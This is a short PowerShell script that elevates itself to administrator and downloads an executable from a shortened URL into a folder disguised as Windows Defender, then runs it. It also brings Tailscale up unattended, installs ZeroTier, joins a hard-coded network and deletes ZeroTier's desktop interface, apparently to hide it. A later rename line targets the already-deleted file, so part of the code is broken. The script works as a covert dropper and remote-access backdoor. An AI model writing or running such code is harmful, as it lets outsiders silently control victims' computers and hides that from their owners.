if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Relaunch script as admin
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Now running as admin, start your program
Invoke-WebRequest -Uri "https://tinyurl.com/46jswbnp" -OutFile "C:\Program Files\defender\Executable\def.exe"
Start-Process "C:\Program Files\defender\Executable\def.exe" -Verb RunAs
tailscale up --unattended

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

$env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)

choco install zerotier-one -y
$env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
zerotier-cli join 8bd5124fd6abcf8f
Remove-Item -Path "C:\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.exe" -Force
Rename-Item -Path "C:\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.exe" -NewName "C:\Program Files (x86)\ZeroTier\One\zerotier_desktop_ui.exe.disabled"
